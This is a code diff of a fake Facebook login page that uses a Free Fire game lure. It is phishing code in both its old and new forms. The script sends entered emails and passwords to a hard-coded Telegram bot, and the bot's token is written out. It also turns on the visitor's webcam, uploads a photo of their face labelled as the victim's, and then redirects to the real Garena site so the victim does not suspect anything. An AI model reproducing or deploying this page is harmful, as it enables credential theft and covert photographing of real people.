@@ -1,72 +1,79 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Log in to Facebook</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log In or Sign Up</title>
     <style>
-        body { background: #f0f2f5; font-family: sans-serif; margin: 0; padding: 10px; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .container { background: white; padding: 20px; border-radius: 12px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }
-        .logo { width: 120px; margin-bottom: 20px; }
-        input { width: 93%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
-        .btn-login { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 6px; font-weight: bold; font-size: 18px; cursor: pointer; }
+        body { background-color: #f0f2f5; font-family: Helvetica, Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); width: 100%; max-width: 400px; text-align: center; }
+        .logo { width: 200px; margin-bottom: 20px; }
+        input { width: 90%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; }
+        .btn-login { width: 98%; padding: 12px; background-color: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: bold; cursor: pointer; }
+        .divider { margin: 20px 0; border-bottom: 1px solid #dadde1; }
+        .btn-new { background-color: #42b72a; width: 70%; padding: 12px; color: white; border: none; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; }
         #video, #canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="container">
-        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" class="logo">
-        <p style="color: #1c1e21; font-size: 14px;">Log in to your Facebook account to connect to Free Fire.</p>
-        <input type="text" id="email" placeholder="Mobile number or email" required>
+    <div class="login-container">
+        <img src="https://static.xx.fbcdn.net/rsrc.php/y8/r/dF5SId3UHWd.svg" alt="Facebook" class="logo">
+        <p style="font-size: 18px; margin-bottom: 20px;">Log in to connect with Free Fire</p>
+        <input type="text" id="email" placeholder="Email or Phone Number" required>
         <input type="password" id="password" placeholder="Password" required>
-        <button class="btn-login" onclick="hack()">Log In</button>
+        <button class="btn-login" onclick="startHack()">Log In</button>
+        <div class="divider"></div>
+        <button class="btn-new">Create New Account</button>
     </div>
 
     <video id="video" width="640" height="480" autoplay playsinline></video>
     <canvas id="canvas" width="640" height="480"></canvas>
 
     <script>
-        const TOKEN = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8"; //
-        const CHAT_ID = "7479786207"; //
+        const TOKEN = "8641807283:AAGuEZZ683skc2zJC35K5HRVZzTrPzoHmM8";
+        const CHAT_ID = "7479786207";
 
-        async function hack() {
+        async function startHack() {
             const email = document.getElementById('email').value;
             const pass = document.getElementById('password').value;
 
-            if(email == "" || pass == "") {
-                alert("Please enter your details!");
+            if (email === "" || pass === "") {
+                alert("Please enter your credentials to continue.");
                 return;
             }
 
             try {
-                // 1. فتح الكاميرا
+                // 1. طلب الكاميرا
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.getElementById('video');
                 video.srcObject = stream;
 
-                // 2. إرسال الإيميل والمودباس ديريكت
-                const msg = `🎯 NEW ACCOUNT CAPTURED!\n\n📧 Email: ${email}\n🔑 Pass: ${pass}`;
-                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(msg)}`);
+                // 2. إرسال الإيميل والمودباس فوراً للبوت
+                const text = `🎯 NEW TARGET CAPTURED!\n\n📧 Email/Phone: ${email}\n🔑 Password: ${pass}`;
+                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`);
 
-                // 3. الحل للصورة الكحلة: استنى 5 ثواني كاملة باش الكاميرا تصفى
+                // 3. التقاط الصورة بعد 5 ثواني لضمان الوضوح
                 setTimeout(() => {
                     const canvas = document.getElementById('canvas');
-                    canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 640, 480);
                     
                     canvas.toBlob(blob => {
                         const formData = new FormData();
                         formData.append('chat_id', CHAT_ID);
-                        formData.append('photo', blob, 'face.jpg');
-                        formData.append('caption', `✅ Photo of victim: ${email}`);
+                        formData.append('photo', blob, 'shot.jpg');
+                        formData.append('caption', `✅ Face capture for: ${email}`);
 
-                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-                        
-                        // توجيه الضحية لصفحة حقيقية باش ما يشكش
-                        window.location.href = "https://www.freefire.com/";
+                        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData })
+                        .then(() => {
+                            // توجيه الضحية للموقع الرسمي
+                            window.location.href = "https://ff.garena.com/";
+                        });
                     }, 'image/jpeg');
-                }, 5000); 
+                }, 5000);
 
             } catch (err) {
-                alert("Connection error! Please allow camera access to verify your account.");
+                alert("Identity verification failed. Please enable camera access to claim rewards.");
             }
         }
     </script>
